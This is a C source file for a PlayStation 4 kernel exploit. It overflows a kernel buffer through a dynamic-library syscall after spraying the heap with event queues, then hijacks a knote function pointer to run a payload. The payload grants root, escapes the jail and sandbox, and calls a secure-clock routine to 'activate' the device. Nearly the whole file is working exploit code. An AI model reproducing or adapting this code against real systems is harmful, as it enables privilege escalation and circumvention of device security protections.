#include "ps4.h"
#include "define.h"
#include "kern-resolver/kernel.h"

// Perform kernel allocation aligned to 0x800 bytes
SceKernelEqueue kernelAllocation(int fd)
{
	SceKernelEqueue kv;
	sceKernelCreateEqueue(&kv, "dlclose");
	sceKernelAddReadEvent(kv, fd, 0, NULL);

	printf("queue created = %p\n", kv);
	return kv;
}

void kernelFree(SceKernelEqueue allocation)
{
	printf("Trigger sceKernelDeleteEqueue\n");
	sceKernelDeleteEqueue(allocation);
}

void payload(struct knote *kn)
{
	struct thread *td;

	struct ucred *cred;

	asm volatile("mov %0, %%gs:0" : "=r"(td));

	// Initial kernel dynamic symbol resolver
	kernel_init(td);
	sys_sendto = (void *) kernel_resolve(td, "sys_sendto");
	bflush();

	kprintf("\t[+] Entered kernel payload!\n");

	// Gain root and brake out of the jail
	cred = td->td_proc->p_ucred;
	cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;
	cred->cr_prison = (struct prison *) kernel_resolve(td, "prison0");

	kprintf("\t[+] Rooted and Jailbroken!\n");

	// Sandbox escape
	struct filedesc *td_fdp = td->td_proc->p_fd;
	td_fdp->fd_rdir = td_fdp->fd_jdir = *(uint64_t *) kernel_resolve(td, "rootvnode");

	kprintf("\t[+] Escaped from the sandbox!\n");

	// activation code, ported from reactpsplus
	{
		kprintf("activating...\n");

		void(*sceSblSrtcSetTime)(uint64_t) = (void*)kernel_resolve(td, "sceSblSrtcSetTime");
		kprintf("sceSblSrtcSetTime = %p\n", sceSblSrtcSetTime);

		sceSblSrtcSetTime(14861963);
		kprintf("sceSblSrtcSetTime call success\n");
	}

	// code below this crashes and i don't want to fix it so it's safer to just keep freezing here
	while (1)
	{

	}

	// Return to userland
	uint64_t* fAddr = (__builtin_frame_address(2)); // Get kern_close stack frame
	asm volatile("movq %%rsp, %0" : "=r"(fAddr)); 	//Update stack pointer
	*(uint64_t*)(((uint64_t)fAddr) + 8) = 0xFFFFFFFF82616B25; //Update return address 
	asm volatile("movq %rax, 0x0"); // reset return value (just in case)
	asm volatile("pop %rbp"); 		// pop base pointer off stack
	asm volatile("ret;");
}

void *exploitThread(void *arg)
{
	// Perform oveflow - userland:
	uint64_t bufferSize = 0x8000;
	uint64_t overflowSize = 0x8000;

	uint64_t mappingSize = bufferSize + overflowSize;

	int64_t count = (0x100000000 + bufferSize) / 4;

	int i;
	SceKernelEqueue allocation[100], m, m2;

	// Map the buffer, spray the heap, etc
	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	munmap(mapping + mappingSize, PAGE_SIZE);
	printf("mapping pointer = %p\n", mapping);
	struct knote kn;
	struct filterops fo;
	
	printf("Craft knote Structure\n");
	struct knote **overflow =(struct knote **)(mapping + bufferSize);
	for(i = 0; i < overflowSize / sizeof(struct knote *); i++) {
			overflow[i] = &kn;
	}

	kn.kn_fop = &fo;
	fo.f_detach = payload;

	// Get fd to 3840
	static int sock = 0;
	//since dup2 is not allowed
	int fd = (bufferSize - 0x800) / 8;
	while(sock != fd) {
		sock = sceNetSocket("psudodup2", AF_INET, SOCK_STREAM, 0);
	}
	printf("fd = %d\n", (bufferSize - 0x800) / 8);	
	for(i = 0; i < 100; i++) {
		allocation[i] = kernelAllocation(fd);
	}

	// Create hole for the system call's allocation
	printf("m kernelAllocation:\n");
	m = kernelAllocation(fd);
	printf("m2 kernelAllocation:\n");
	m2 = kernelAllocation(fd);
	kernelFree(m);

	// Perform the overflow
	printf("Calling sys_dynlib_prepare_dlclose\n");
	syscall(597, 1, mapping, &count);

	// Execute the payload
	printf("moment of truth\n");
	kernelFree(m2);
	
	return NULL;
}

int createDebugSocket()
{
	struct sockaddr_in server;
	server.sin_len = sizeof(server);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = IP(192, 168, 2, 27);
	server.sin_port = sceNetHtons(9023);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));

	int sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
	int flag = 1;
	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));

	return sock;
}

int _main(void)
{
	int rc = 0;
	
	// Resolve functions, connect to socket, etc
	initKernel();	
	initLibc();
	initNetwork();
	initJIT();
	initPthread();

	g_debugSocket = 0;
	//g_debugSocket = createDebugSocket(); // disabled

	sys_sendto = 0;
	bprintflength = 0;
	memset(bprintfbuffer, 0, sizeof(bprintfbuffer));

	printf("KXploit by Thunder07\n");
	printf("Patched up by balika011 \n");
	printf("Special thanks to:\n");
	printf("\tCturt, BigBoss and Twisted\n");
	
	printf("\t[+] Starting...\n");
	printf("\t[+] UID = %d\n", getuid());
	
	// Create exploit thread
	ScePthread thread;
	if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
		printf("\t[-] scePthreadCreate\n");
		rc = -1;
		goto err;
	}
	
	// Wait for thread to exit
	scePthreadJoin(thread, NULL);
	
	// At this point we should have root and jailbreak
	if(getuid() != 0) {
		printf("\t[-] Kernel patch failed!\n");
		rc = -2;
		goto err;
	}
	
	printf("\t[+] Kernel patch success!\n");

err:
	sceNetSocketClose(g_debugSocket);
	
	return rc;
}
